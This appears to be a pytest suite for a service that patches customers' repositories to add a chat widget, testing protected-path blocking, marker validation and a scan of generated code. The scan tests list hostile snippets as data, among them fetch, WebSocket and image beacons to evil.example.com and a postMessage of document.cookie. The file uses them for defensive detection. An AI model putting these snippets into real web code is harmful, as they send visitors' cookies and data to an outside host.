"""Safety gates that must hold before `GitHubProvider` touches a real repository.

Each test corresponds to one item on the CLAUDE.md §3 blocker list: protected paths (FR-096,
invariant §4.9), marker-pair discipline, `/plan` error reporting, a required `base_sha`, and the
generated-code security scan (FR-097).
"""

import posixpath
import uuid

import pytest
from httpx import AsyncClient
from sqlalchemy import select

from app.core.database import get_session_factory
from app.core.protected_paths import protected_reason
from app.models.website_integration import WebsiteIntegration
from app.schemas.website_integration import IntegrationPlanPayload
from app.services.integration.artifacts import (
    HTML_BEGIN,
    HTML_END,
    REACT_BEGIN_IMPORT,
    REACT_BEGIN_JSX,
    REACT_END_IMPORT,
    REACT_END_JSX,
    patch_html_index,
)
from app.services.integration.code_scan import scan_generated_code
from app.services.integration.github import MockGitProvider, set_git_provider
from app.services.integration.validation import StaticValidationError, StaticValidator

REACT_LAYOUT = """export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <body>{children}</body>
    </html>
  );
}
"""


async def register_user(client: AsyncClient, email: str, name: str) -> tuple[str, str, str]:
    resp = await client.post(
        "/api/v1/auth/register",
        json={"email": email, "password": "Password123!", "full_name": name, "org_name": f"{name} Org"},
    )
    assert resp.status_code == 201
    token = resp.json()["access_token"]
    orgs = await client.get("/api/v1/organizations", headers={"Authorization": f"Bearer {token}"})
    return token, resp.json()["user"]["id"], orgs.json()[0]["id"]


async def create_project(client: AsyncClient, token: str, org_id: str, slug: str) -> str:
    resp = await client.post(
        f"/api/v1/organizations/{org_id}/projects",
        headers={"Authorization": f"Bearer {token}"},
        json={"name": slug, "slug": slug},
    )
    assert resp.status_code == 201
    return resp.json()["id"]


def plan_for(target: str, created: list[str] | None = None) -> IntegrationPlanPayload:
    return IntegrationPlanPayload(
        framework_skill_id="nextjs-app-router",
        files_to_create=created or [],
        files_to_modify=[target],
        target_status="exists",
    )


# ============================================================
# 1. PROTECTED PATHS — FR-096, invariant §4.9
# ============================================================


@pytest.mark.parametrize(
    "path",
    [
        ".env",
        ".env.local",
        ".env.production",
        "credentials/service-account.json",
        ".github/workflows/deploy.yml",
        ".github/workflows/ci.yaml",
        "infrastructure/docker-compose.yml",
        "Dockerfile",
        "docker-compose.yml",
        "fly.toml",
        "vercel.json",
        "netlify.toml",
        "terraform/main.tf",
        "k8s/deployment.yaml",
        "app/api/auth/[...nextauth]/route.ts",
        "src/lib/auth.ts",
        "src/payments/stripe.ts",
        "src/billing/checkout.ts",
        "prisma/schema.prisma",
        "db/migrations/0001_init.sql",
        "alembic/versions/0001_init.py",
    ],
)
def test_protected_paths_are_recognised(path: str) -> None:
    assert protected_reason(path) is not None, path


@pytest.mark.parametrize(
    "path",
    [
        "app/layout.tsx",
        "src/app/layout.tsx",
        "index.html",
        "components/fussion/FussionAssistant.tsx",
        "lib/fussion-assistant.ts",
        "pages/_app.tsx",
        "src/routes/+layout.svelte",
    ],
)
def test_ordinary_widget_targets_are_not_protected(path: str) -> None:
    assert protected_reason(path) is None, path


def test_validator_refuses_a_protected_widget_target() -> None:
    """A user-supplied widget_target_path of .github/workflows/deploy.yml must not pass."""
    target = ".github/workflows/deploy.yml"
    patched = f"{REACT_BEGIN_IMPORT}\nimport x from 'y';\n{REACT_END_IMPORT}\nname: deploy\n"

    with pytest.raises(StaticValidationError) as exc:
        StaticValidator.validate(
            framework_skill_id="nextjs-app-router",
            plan=plan_for(target),
            files={target: patched},
            original_files={target: "name: deploy\n"},
        )
    assert any("protected" in issue.lower() for issue in exc.value.issues)


def test_validator_refuses_a_protected_created_file() -> None:
    with pytest.raises(StaticValidationError) as exc:
        StaticValidator.validate(
            framework_skill_id="nextjs-app-router",
            plan=plan_for("app/layout.tsx", created=[".env.production"]),
            files={
                "app/layout.tsx": _patched_react(REACT_LAYOUT),
                ".env.production": "FUSSION_KEY=abc\n",
            },
            original_files={"app/layout.tsx": REACT_LAYOUT},
        )
    assert any("protected" in issue.lower() for issue in exc.value.issues)


@pytest.mark.asyncio
async def test_configuration_refuses_a_protected_target(client: AsyncClient) -> None:
    """The earliest gate: a protected target never becomes stored configuration at all.

    Without this the user saves happily, `GET /plan` renders a plan promising to modify a workflow
    file, and only the run — at the very end — refuses.
    """
    token, _, org_id = await register_user(client, "prot@example.com", "Prot")
    hdr = {"Authorization": f"Bearer {token}"}
    project_id = await create_project(client, token, org_id, "prot-proj")
    url = f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations"

    created = await client.post(
        url,
        headers=hdr,
        json={
            "repository_owner": "acme",
            "repository_name": "site",
            "widget_target_path": ".github/workflows/deploy.yml",
        },
    )
    assert created.status_code == 422
    assert "protected" in created.text.lower()
    # Nothing was stored.
    assert (await client.get(url, headers=hdr)).status_code == 404

    # A safe target is accepted, and cannot later be edited into a protected one.
    ok = await client.post(
        url,
        headers=hdr,
        json={"repository_owner": "acme", "repository_name": "site", "widget_target_path": "app/layout.tsx"},
    )
    assert ok.status_code == 201
    patched = await client.patch(url, headers=hdr, json={"widget_target_path": "middleware.ts"})
    assert patched.status_code == 422
    assert (await client.get(url, headers=hdr)).json()["widget_target_path"] == "app/layout.tsx"


@pytest.mark.asyncio
async def test_run_refuses_a_protected_target_before_touching_the_repository(client: AsyncClient) -> None:
    """The backstop: a protected path that reaches the database anyway is refused by the run.

    Reachable without the schema gate — a row predating it, a data migration, or any future code
    path that sets the column directly. Two layers only count as two if each is tested alone.
    """
    token, _, org_id = await register_user(client, "prot2@example.com", "Prot2")
    hdr = {"Authorization": f"Bearer {token}"}
    project_id = await create_project(client, token, org_id, "prot-proj-2")

    mock = MockGitProvider()
    mock.add_repository("acme", "site")
    mock.add_file("acme", "site", ".github/workflows/deploy.yml", "name: deploy\n")
    branches_before = dict(mock.branches)
    set_git_provider(mock)

    created = await client.post(
        f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations",
        headers=hdr,
        json={"repository_owner": "acme", "repository_name": "site", "widget_target_path": "app/layout.tsx"},
    )
    assert created.status_code == 201

    # Bypass the schema gate the way a pre-existing row would.
    session_factory = get_session_factory()
    async with session_factory() as db:
        integration = (
            await db.execute(
                select(WebsiteIntegration).where(WebsiteIntegration.id == uuid.UUID(created.json()["id"]))
            )
        ).scalar_one()
        integration.widget_target_path = ".github/workflows/deploy.yml"
        await db.commit()

    run = await client.post(
        f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations/runs",
        headers=hdr,
    )
    assert run.status_code == 422
    assert "protected" in run.json()["detail"].lower()
    assert mock.branches == branches_before, "no branch may be created for a protected target"

    # The run recorded no plan, so the diff endpoint reports 409 rather than inventing a diff (C12).
    runs = (
        await client.get(
            f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations/runs",
            headers=hdr,
        )
    ).json()
    diff = await client.get(
        f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations"
        f"/runs/{runs[0]['id']}/diff",
        headers=hdr,
    )
    assert diff.status_code == 409


# ============================================================
# 2. MARKER-PAIR DISCIPLINE
# ============================================================


def _patched_react(original: str) -> str:
    """What the deterministic patcher produces for a React layout."""
    from app.services.integration.artifacts import patch_react_layout

    return patch_react_layout(original)


def test_an_edit_wrapped_in_marker_text_does_not_bypass_the_validator() -> None:
    """The bypass logged in CLAUDE.md §3: wrapping a customer edit in marker text made it
    invisible, because the validator stripped any marker pair wherever it appeared."""
    smuggled = _patched_react(REACT_LAYOUT).replace(
        "{children}", f"{REACT_BEGIN_JSX}{{/* customer content removed */}}{REACT_END_JSX}"
    )
    assert REACT_BEGIN_JSX in smuggled and "{children}" not in smuggled

    with pytest.raises(StaticValidationError) as exc:
        StaticValidator.validate(
            framework_skill_id="nextjs-app-router",
            plan=plan_for("app/layout.tsx"),
            files={"app/layout.tsx": smuggled},
            original_files={"app/layout.tsx": REACT_LAYOUT},
        )
    assert exc.value.issues


def test_more_marker_pairs_than_the_patcher_emits_is_rejected() -> None:
    extra = _patched_react(REACT_LAYOUT) + f"\n{REACT_BEGIN_JSX}\n<Extra />\n{REACT_END_JSX}\n"

    with pytest.raises(StaticValidationError):
        StaticValidator.validate(
            framework_skill_id="nextjs-app-router",
            plan=plan_for("app/layout.tsx"),
            files={"app/layout.tsx": extra},
            original_files={"app/layout.tsx": REACT_LAYOUT},
        )


def test_a_marker_sharing_its_line_with_other_code_is_rejected() -> None:
    inline = _patched_react(REACT_LAYOUT).replace(
        f"        {REACT_BEGIN_JSX}\n", f"        {REACT_BEGIN_JSX} const stolen = 1;\n"
    )

    with pytest.raises(StaticValidationError):
        StaticValidator.validate(
            framework_skill_id="nextjs-app-router",
            plan=plan_for("app/layout.tsx"),
            files={"app/layout.tsx": inline},
            original_files={"app/layout.tsx": REACT_LAYOUT},
        )


def test_a_foreign_marker_family_is_rejected() -> None:
    """An HTML marker pair has no business in a .tsx file."""
    foreign = _patched_react(REACT_LAYOUT).replace(
        "{children}", f"{HTML_BEGIN}\n      {{children}}\n      {HTML_END}"
    )
    assert HTML_BEGIN in foreign

    with pytest.raises(StaticValidationError):
        StaticValidator.validate(
            framework_skill_id="nextjs-app-router",
            plan=plan_for("app/layout.tsx"),
            files={"app/layout.tsx": foreign},
            original_files={"app/layout.tsx": REACT_LAYOUT},
        )


def test_the_deterministic_patch_still_passes() -> None:
    """The discipline above must not reject what the patcher actually emits."""
    StaticValidator.validate(
        framework_skill_id="nextjs-app-router",
        plan=plan_for("app/layout.tsx", created=["components/fussion/FussionAssistant.tsx"]),
        files={
            "app/layout.tsx": _patched_react(REACT_LAYOUT),
            "components/fussion/FussionAssistant.tsx": "export const FussionAssistant = () => null;\n",
        },
        original_files={"app/layout.tsx": REACT_LAYOUT},
    )


def test_html_patcher_refuses_an_ambiguous_closing_body() -> None:
    """Two `</body>` occurrences: one is inside a script string, and text matching cannot tell.

    Patching every occurrence corrupted the page; patching the last one corrupted a different
    shape. Either way the damage sits inside a managed block, which is exactly what the validator
    does not compare — so the only honest answer is to refuse.
    """
    from app.services.integration.artifacts import WidgetInjectionError

    content = (
        "<html><body>\n"
        "<script>var tpl = '<body>hello</body>';</script>\n"
        "</body></html>\n"
    )
    with pytest.raises(WidgetInjectionError, match="appears 2 times"):
        patch_html_index(content)


# ============================================================
# 3. GENERATED-CODE SECURITY SCAN — FR-097
# ============================================================


@pytest.mark.parametrize(
    "snippet",
    [
        "eval('2+2')",
        "const f = new Function('return 1');",
        "document.write('<b>x</b>');",
        "<script src=\"https://evil.example.com/x.js\"></script>",
        "fetch('https://evil.example.com/collect', {method:'POST'})",
        "new WebSocket('wss://evil.example.com/ws')",
        "const x = new XMLHttpRequest(); x.open('GET', 'https://evil.example.com');",
        "<div onclick=\"steal()\">x</div>",
        "<img src=x onerror=\"fetch('https://evil.example.com')\">",
        "atob('ZXZpbA==')",
        "window.parent.postMessage(document.cookie, '*')",
    ],
)
def test_scan_rejects_dangerous_generated_code(snippet: str) -> None:
    assert scan_generated_code("components/fussion/FussionAssistant.tsx", snippet), snippet


@pytest.mark.parametrize(
    "snippet",
    [
        "export const FussionAssistant = () => null;\n",
        "fetch('/api/v1/public/chat', {method: 'POST'})",
        "<script src=\"/fussion-assistant.js\"></script>",
        "export const fussionAssistantConfig = {\"projectId\": \"abc\"} as const;\n",
        "const el = document.createElement('div'); el.textContent = 'hi';",
    ],
)
def test_scan_accepts_fussion_generated_code(snippet: str) -> None:
    assert scan_generated_code("components/fussion/FussionAssistant.tsx", snippet) == [], snippet


def test_validator_scans_only_managed_blocks_of_a_modified_file() -> None:
    """A customer's own `fetch` to their own host is not Fussion's to police; the same call
    inside a Fussion-managed block is."""
    customer = REACT_LAYOUT.replace(
        "<body>", "<body onLoad=\"track()\">\n      {/* customer: */}\n"
    ).replace("{children}", "{children}{fetch('https://analytics.customer.com')}")

    StaticValidator.validate(
        framework_skill_id="nextjs-app-router",
        plan=plan_for("app/layout.tsx"),
        files={"app/layout.tsx": _patched_react(customer)},
        original_files={"app/layout.tsx": customer},
    )

    hostile = _patched_react(customer).replace(
        "        <FussionAssistant />\n",
        "        <FussionAssistant onLoad=\"fetch('https://evil.example.com')\" />\n",
    )
    with pytest.raises(StaticValidationError) as exc:
        StaticValidator.validate(
            framework_skill_id="nextjs-app-router",
            plan=plan_for("app/layout.tsx"),
            files={"app/layout.tsx": hostile},
            original_files={"app/layout.tsx": customer},
        )
    assert exc.value.issues


# ============================================================
# 4. base_sha IS REQUIRED
# ============================================================


@pytest.mark.asyncio
async def test_create_branch_requires_an_explicit_base_sha() -> None:
    """Without this, a future caller silently re-resolves the moving head — the §3.1 race."""
    mock = MockGitProvider()
    mock.add_repository("acme", "site")

    with pytest.raises(TypeError):
        await mock.create_branch("acme", "site", "main", "fussion/x")  # type: ignore[call-arg]


def test_git_provider_protocol_has_no_base_sha_default() -> None:
    import inspect

    from app.services.integration.git_provider import GitProvider

    signature = inspect.signature(GitProvider.create_branch)
    assert signature.parameters["base_sha"].default is inspect.Parameter.empty


# ============================================================
# 5. /plan REPORTS THE REAL CAUSE
# ============================================================


@pytest.mark.asyncio
async def test_plan_does_not_report_a_missing_repository_as_a_missing_file(client: AsyncClient) -> None:
    token, _, org_id = await register_user(client, "planerr@example.com", "PlanErr")
    hdr = {"Authorization": f"Bearer {token}"}
    project_id = await create_project(client, token, org_id, "planerr-proj")

    set_git_provider(MockGitProvider())  # empty: the repository does not exist
    await client.post(
        f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations",
        headers=hdr,
        json={"repository_owner": "acme", "repository_name": "missing"},
    )

    resp = await client.get(
        f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations/plan",
        headers=hdr,
    )
    assert resp.status_code == 400
    detail = resp.json()["detail"].lower()
    assert "repository" in detail or "branch" in detail
    assert "widget path" not in detail


@pytest.mark.asyncio
async def test_plan_does_not_report_a_missing_branch_as_a_missing_file(client: AsyncClient) -> None:
    token, _, org_id = await register_user(client, "planbranch@example.com", "PlanBranch")
    hdr = {"Authorization": f"Bearer {token}"}
    project_id = await create_project(client, token, org_id, "planbranch-proj")

    mock = MockGitProvider()
    mock.add_repository("acme", "site")
    mock.add_file("acme", "site", "app/layout.tsx", REACT_LAYOUT)
    set_git_provider(mock)
    await client.post(
        f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations",
        headers=hdr,
        json={"repository_owner": "acme", "repository_name": "site", "default_branch": "nonexistent"},
    )

    resp = await client.get(
        f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations/plan",
        headers=hdr,
    )
    assert resp.status_code == 400
    assert "branch" in resp.json()["detail"].lower()


@pytest.mark.asyncio
async def test_plan_still_reports_a_genuinely_missing_file_as_missing(client: AsyncClient) -> None:
    token, _, org_id = await register_user(client, "planok@example.com", "PlanOk")
    hdr = {"Authorization": f"Bearer {token}"}
    project_id = await create_project(client, token, org_id, "planok-proj")

    mock = MockGitProvider()
    mock.add_repository("acme", "site")
    mock.add_file("acme", "site", "README.md", "# hello\n")  # repo and branch exist, target does not
    set_git_provider(mock)
    await client.post(
        f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations",
        headers=hdr,
        json={"repository_owner": "acme", "repository_name": "site"},
    )

    resp = await client.get(
        f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations/plan",
        headers=hdr,
    )
    assert resp.status_code == 200
    assert resp.json()["target_status"] == "missing"


# ============================================================
# 6. THE REAL PROVIDER IS WIRED, AND NOT DURING TESTS
# ============================================================


def test_application_startup_wires_the_real_provider() -> None:
    """The pipeline has only ever run against MockGitProvider (CLAUDE.md §2). Startup must
    install the real one — and the test suite must not get it."""
    from app.main import configure_git_provider
    from app.services.integration.github import GitHubProvider, get_git_provider

    previous = get_git_provider()
    try:
        configure_git_provider()
        assert isinstance(get_git_provider(), GitHubProvider)
    finally:
        set_git_provider(previous)


@pytest.mark.asyncio
async def test_the_suite_runs_against_the_mock(client: AsyncClient) -> None:
    from app.services.integration.github import get_git_provider

    mock = MockGitProvider()
    set_git_provider(mock)
    assert get_git_provider() is mock
    assert isinstance(uuid.UUID(str(uuid.uuid4())), uuid.UUID)


# ============================================================
# 6. REVIEW FINDINGS — REACHABLE ONLY ONCE THE PROVIDER IS REAL
# ============================================================


DELEGATING_LAYOUT = """export default function RootLayout({ children }) {
  return <Providers>{children}</Providers>;
}
"""


def test_a_layout_with_no_injection_point_is_refused_not_appended_to() -> None:
    """Appending blind put the widget JSX after the component's closing brace — a file that does
    not compile, which the validator cannot catch because it never inspects managed-block content.
    """
    from app.services.integration.artifacts import WidgetInjectionError, patch_react_layout

    with pytest.raises(WidgetInjectionError) as exc:
        patch_react_layout(DELEGATING_LAYOUT)
    assert "</body>" in str(exc.value) or "</main>" in str(exc.value)


@pytest.mark.asyncio
async def test_run_refuses_a_layout_it_cannot_patch(client: AsyncClient) -> None:
    token, _, org_id = await register_user(client, "delegating@example.com", "Deleg")
    hdr = {"Authorization": f"Bearer {token}"}
    project_id = await create_project(client, token, org_id, "deleg-proj")

    mock = MockGitProvider()
    mock.add_repository("acme", "site")
    mock.add_file("acme", "site", "app/layout.tsx", DELEGATING_LAYOUT)
    set_git_provider(mock)

    await client.post(
        f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations",
        headers=hdr,
        json={"repository_owner": "acme", "repository_name": "site", "widget_target_path": "app/layout.tsx"},
    )
    run = await client.post(
        f"/api/v1/organizations/{org_id}/projects/{project_id}/website-integrations/runs",
        headers=hdr,
    )
    assert run.status_code == 422
    assert "cannot integrate" in run.json()["detail"].lower()
    assert mock.pull_requests == {}, "nothing may be opened for a file Fussion cannot patch"


def test_react_patch_emits_exactly_one_block_and_validates() -> None:
    patched = _patched_react(REACT_LAYOUT)
    assert patched.count(REACT_BEGIN_JSX) == 1
    assert patched.count(REACT_END_JSX) == 1

    StaticValidator.validate(
        framework_skill_id="nextjs-app-router",
        plan=plan_for("app/layout.tsx"),
        files={"app/layout.tsx": patched},
        original_files={"app/layout.tsx": REACT_LAYOUT},
    )


@pytest.mark.parametrize(
    "layout",
    [
        # `</body>` in a string before the real element…
        """export default function RootLayout({ children }) {
  const template = '<div></body>';
  return (<html><body>{children}</body></html>);
}
""",
        # …and after it. Round 1 fixed "patch every occurrence" by patching the last one, which
        # corrupts exactly this shape: the JSX lands inside the template string.
        """export default function RootLayout({ children }) {
  return (<html><body>{children}</body></html>);
}
export const emailTemplate = '<html><body>hi</body></html>';
""",
    ],
)
def test_react_patch_refuses_an_ambiguous_layout(layout: str) -> None:
    """Neither shape is distinguishable by text matching, and both produce a file that does not
    compile if guessed wrong — inside a managed block the validator never inspects."""
    from app.services.integration.artifacts import WidgetInjectionError

    with pytest.raises(WidgetInjectionError, match="cannot tell which one is the real element"):
        _patched_react(layout)


@pytest.mark.parametrize(
    "html",
    [
        "<html>\n<body>\n<h1>hi</h1>\n</body>\n</html>\n",
        # Minified: no newline before </body>. The marker rule shipped without the newline the
        # blocker text asked for, so generic HTML — a supported framework — refused every
        # compact index.html and blamed the customer's file.
        "<html><body><h1>hi</h1></body></html>\n",
        '<!doctype html><html><head><title>x</title></head><body><div id=app></div></body></html>',
    ],
)
def test_html_patch_keeps_markers_alone_on_their_lines(html: str) -> None:
    patched = patch_html_index(html)
    marker_lines = [line.strip() for line in patched.splitlines() if HTML_BEGIN in line or HTML_END in line]
    assert marker_lines == [HTML_BEGIN, HTML_END], patched

    StaticValidator.validate(
        framework_skill_id="generic-html",
        plan=plan_for("index.html", created=["fussion-assistant.js"]),
        files={"index.html": patched, "fussion-assistant.js": "// noop\n"},
        original_files={"index.html": html},
    )


@pytest.mark.parametrize(
    "path",
    [
        "middleware.ts",
        "src/middleware.ts",
        ".npmrc",
        ".envrc",
        "Jenkinsfile",
        ".circleci/config.yml",
        "azure-pipelines.yml",
        ".github/actions/deploy/action.yml",
        # Case matters on the way in, not to the rule: these spellings all exist in real repos.
        ".ENV",
        "Secrets/key.pem",
        "Credentials/gcp.json",
        "app/Auth/login.tsx",
        "Migrations/001_init.sql",
        "Dockerfile.prod",
    ],
)
def test_more_protected_paths_are_recognised(path: str) -> None:
    assert protected_reason(path) is not None, path


@pytest.mark.parametrize(
    "path",
    ["app/layout.tsx", "src/app/layout.tsx", "index.html", "components/fussion/FussionAssistant.tsx"],
)
def test_ordinary_application_paths_are_not_protected(path: str) -> None:
    assert protected_reason(path) is None, path


def test_first_changed_line_requires_its_marker_family() -> None:
    """The default was `MANAGED_BLOCKS` — every family — which is the bypass this slice removed.

    Same trap as `create_branch(base_sha=None)`, deleted in the same diff for the same reason: a
    caller who omits the argument would silently get the unsafe comparison and no test would fail.
    """
    from app.services.integration.validation import first_changed_line

    with pytest.raises(TypeError):
        first_changed_line("a\n", "a\n")  # type: ignore[call-arg]


def test_marker_family_lookup_is_case_insensitive() -> None:
    from app.services.integration.artifacts import REACT_MARKER_PAIRS, marker_pairs_for_path

    assert marker_pairs_for_path("app/layout.TSX") == REACT_MARKER_PAIRS
    assert marker_pairs_for_path("app/layout.mjs") == REACT_MARKER_PAIRS
    assert marker_pairs_for_path("INDEX.HTML") != ()
    assert marker_pairs_for_path("template.twig") == ()


@pytest.mark.parametrize(
    "url",
    [
        "//evil.example.com/x.js",
        "data:text/javascript;base64,YWxlcnQoMSk=",
        "javascript:alert(1)",
        "https://evil.example.com/a.js",
        "http://evil.example.com/a.js",
        "https://user@evil.example.com/a.js",
    ],
)
def test_foreign_script_sources_are_rejected(url: str) -> None:
    """A protocol-relative or data: script src is the FR-097 category exactly; both were treated
    as same-origin because they do not start with `https://`."""
    issues = scan_generated_code("widget.html", f'<script src="{url}"></script>')
    assert issues, url


@pytest.mark.parametrize(
    "url",
    ["/fussion-assistant.js", "./widget.js", "assets/widget.js", "https://cdn.fussion.dev/widget.js"],
)
def test_same_origin_and_fussion_sources_are_accepted(url: str) -> None:
    assert scan_generated_code("widget.html", f'<script src="{url}"></script>') == []


def test_exfiltration_without_a_network_call_is_caught() -> None:
    """`<img src>` needs no fetch token, and the host check used to run only when one was present."""
    assert scan_generated_code("widget.html", '<img src="https://evil.example.com/?d=1">')
    assert scan_generated_code("widget.js", 'const p = new Image(); p.src = "https://evil.example.com/?d=1";')


def test_the_real_generated_widget_passes_the_scan() -> None:
    """Scan what Fussion actually emits, not a stub.

    Nothing else keeps this true: B8's real widget will add a fetch, and without this test the
    first signal would be every production run failing validation.
    """
    from app.services.integration.artifacts import (
        generate_html_widget_script,
        generate_react_config_ts,
        generate_react_widget_component,
    )
    from app.services.integration.validation import managed_block_contents, marker_pairs_for_path

    assistant = {
        "id": "11111111-1111-1111-1111-111111111111",
        "name": "Acme Helper",
        "welcome_message": "Hi!",
        "brand_color": "#6366F1",
        "text_color": "#FFFFFF",
        "position": "BOTTOM_RIGHT",
        "is_enabled": True,
    }
    project_id = "22222222-2222-2222-2222-222222222222"

    generated = {
        "components/fussion/FussionAssistant.tsx": generate_react_widget_component(assistant),
        "lib/fussion-assistant.ts": generate_react_config_ts(project_id, assistant),
        "fussion-assistant.js": generate_html_widget_script(project_id, assistant),
    }
    for path, content in generated.items():
        assert scan_generated_code(path, content) == [], path

    for path, patched in (
        ("app/layout.tsx", _patched_react(REACT_LAYOUT)),
        ("index.html", patch_html_index("<html><body><h1>hi</h1></body></html>\n")),
    ):
        for block in managed_block_contents(patched, marker_pairs_for_path(path)):
            assert scan_generated_code(path, block) == [], path


@pytest.mark.asyncio
async def test_an_unconfigured_process_refuses_rather_than_faking_success() -> None:
    """The module default used to be a mock that fabricates a commit SHA and a PR URL.

    A process that skipped `lifespan` would record PR_CREATED with a dead link — a silent
    fallback, which §4.10 prohibits.
    """
    from app.services.integration.github import _UnconfiguredGitProvider

    provider = _UnconfiguredGitProvider()
    for method in ("get_repository", "get_file_contents", "get_branch_head", "create_branch",
                   "commit_files", "create_pull_request", "get_pull_request"):
        with pytest.raises(RuntimeError, match="No git provider is configured"):
            await getattr(provider, method)("acme", "site")


def test_the_test_environment_still_defaults_to_the_mock() -> None:
    from app.services.integration.github import MockGitProvider, _default_provider

    assert isinstance(_default_provider(), MockGitProvider)


# ============================================================
# 7. ROUND-2 FINDINGS — OUTPUT THAT HAS TO BUILD IN A REAL REPO
# ============================================================


SRC_LAYOUT_TARGET = "src/app/layout.tsx"

USE_CLIENT_LAYOUT = """'use client';

export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <body>{children}</body>
    </html>
  );
}
"""


def test_generated_files_follow_the_project_source_root() -> None:
    """`@/` resolves to `src/` on a src-layout project, so root-level files did not exist and the
    pull request did not build (hazard §3.3, whose trigger was 'before B8' — this is that slice).
    """
    from app.services.integration.artifacts import generate_artifacts

    files = generate_artifacts(
        project_id=uuid.uuid4(),
        assistant_data={"name": "Acme", "is_enabled": True},
        framework_skill_id="nextjs-app-router",
        widget_target_path=SRC_LAYOUT_TARGET,
        existing_target_content=REACT_LAYOUT,
    )

    assert set(files) == {
        "src/components/fussion/FussionAssistant.tsx",
        "src/lib/fussion-assistant.ts",
        SRC_LAYOUT_TARGET,
    }
    # The layout imports the component it actually wrote, by a path that needs no tsconfig alias.
    assert "from '../components/fussion/FussionAssistant'" in files[SRC_LAYOUT_TARGET]
    assert "from '../../lib/fussion-assistant'" in files["src/components/fussion/FussionAssistant.tsx"]
    assert "@/" not in files[SRC_LAYOUT_TARGET]


def test_relative_imports_resolve_for_both_layouts() -> None:
    from app.services.integration.artifacts import relative_import, source_root_for

    assert source_root_for("app/layout.tsx") == ""
    assert source_root_for("src/app/layout.tsx") == "src/"
    assert source_root_for("apps/web/src/pages/_app.tsx") == "apps/web/src/"

    # posixpath.normpath of (layout dir)/(specifier) must equal the file that was written.
    for target, component in (
        ("app/layout.tsx", "components/fussion/FussionAssistant.tsx"),
        ("src/app/layout.tsx", "src/components/fussion/FussionAssistant.tsx"),
    ):
        specifier = relative_import(target, component)
        resolved = posixpath.normpath(posixpath.join(posixpath.dirname(target), specifier))
        assert resolved == posixpath.splitext(component)[0], (target, specifier)


def test_a_target_outside_an_app_tree_is_refused() -> None:
    from app.services.integration.artifacts import WidgetInjectionError, source_root_for

    with pytest.raises(WidgetInjectionError, match="source root"):
        source_root_for("components/Shell.tsx")


def test_the_plan_declares_exactly_what_a_src_layout_generates() -> None:
    """The plan and the generator derive the source root the same way, or validation refuses
    Fussion's own output as 'outside the declared plan'."""
    from app.services.integration.artifacts import generate_artifacts
    from app.services.integration.planner import IntegrationPlanner

    plan = IntegrationPlanner.generate_plan(
        framework_skill_id="nextjs-app-router",
        widget_target_path=SRC_LAYOUT_TARGET,
        assistant_data={"is_enabled": True},
        has_knowledge_base=True,
        target_status="exists",
    )
    files = generate_artifacts(
        project_id=uuid.uuid4(),
        assistant_data={"name": "Acme", "is_enabled": True},
        framework_skill_id="nextjs-app-router",
        widget_target_path=SRC_LAYOUT_TARGET,
        existing_target_content=REACT_LAYOUT,
    )

    assert set(files) == set(plan.files_to_create + plan.files_to_modify)
    StaticValidator.validate(
        framework_skill_id="nextjs-app-router",
        plan=plan,
        files=files,
        original_files={SRC_LAYOUT_TARGET: REACT_LAYOUT},
    )


def test_the_import_block_goes_below_a_use_client_directive() -> None:
    """An import above `'use client'` stops it being a directive, and next-swc fails the build."""
    patched = _patched_react(USE_CLIENT_LAYOUT)
    lines = [line.strip() for line in patched.splitlines() if line.strip()]

    assert lines[0] == "'use client';", patched
    assert lines[1] == REACT_BEGIN_IMPORT, patched

    StaticValidator.validate(
        framework_skill_id="nextjs-app-router",
        plan=plan_for("app/layout.tsx"),
        files={"app/layout.tsx": patched},
        original_files={"app/layout.tsx": USE_CLIENT_LAYOUT},
    )


def test_an_assistant_avatar_does_not_block_the_run() -> None:
    """The tenant's own avatar host is configuration, not an undeclared host in Fussion's code.

    Scanning it as code meant every tenant who filled in the avatar field got a 400 telling them
    Fussion's generated code referenced an undeclared host.
    """
    from app.services.integration.artifacts import (
        generate_html_widget_script,
        generate_react_config_ts,
    )

    assistant = {
        "id": str(uuid.uuid4()),
        "name": "Acme Helper",
        "avatar_url": "https://cdn.example.com/avatar.png",
        "starter_prompt": "Ask about shipping: rates, times, returns",
        "is_enabled": True,
    }
    project_id = str(uuid.uuid4())

    for path, content in (
        ("lib/fussion-assistant.ts", generate_react_config_ts(project_id, assistant)),
        ("fussion-assistant.js", generate_html_widget_script(project_id, assistant)),
    ):
        assert scan_generated_code(path, content) == [], path
        assert "cdn.example.com" in content, "the avatar must still reach the customer's site"


def test_an_executable_scheme_in_configuration_is_still_refused() -> None:
    """Configuration may point anywhere, but never at something the browser executes."""
    from app.services.integration.artifacts import generate_react_config_ts

    content = generate_react_config_ts(
        str(uuid.uuid4()), {"name": "Acme", "avatar_url": "javascript:alert(1)", "is_enabled": True}
    )
    issues = scan_generated_code("lib/fussion-assistant.ts", content)
    assert any("javascript:" in issue for issue in issues), issues


def test_generated_files_carry_no_retired_phase_numbers_or_console_logging() -> None:
    """These strings ship into a customer's repository and onto their production site."""
    from app.services.integration.artifacts import (
        generate_html_widget_script,
        generate_react_config_ts,
        generate_react_widget_component,
    )

    assistant = {"name": "Acme", "is_enabled": True}
    for content in (
        generate_react_widget_component(assistant),
        generate_react_config_ts(str(uuid.uuid4()), assistant),
        generate_html_widget_script(str(uuid.uuid4()), assistant),
    ):
        assert "Phase 11" not in content
        assert "Phase 12" not in content
        assert "console.log" not in content


@pytest.mark.parametrize("target", ["index.php", "templates/base.html.erb", "public/app.jsp"])
def test_a_static_target_that_is_not_html_is_refused_not_substituted(target: str) -> None:
    """Substituting `index.html` generated a file the plan never declared, so the run failed with
    the plan taking the blame for the generator's substitution."""
    from app.services.integration.artifacts import WidgetInjectionError, generate_artifacts

    with pytest.raises(WidgetInjectionError, match="not an HTML file"):
        generate_artifacts(
            project_id=uuid.uuid4(),
            assistant_data={"name": "Acme", "is_enabled": True},
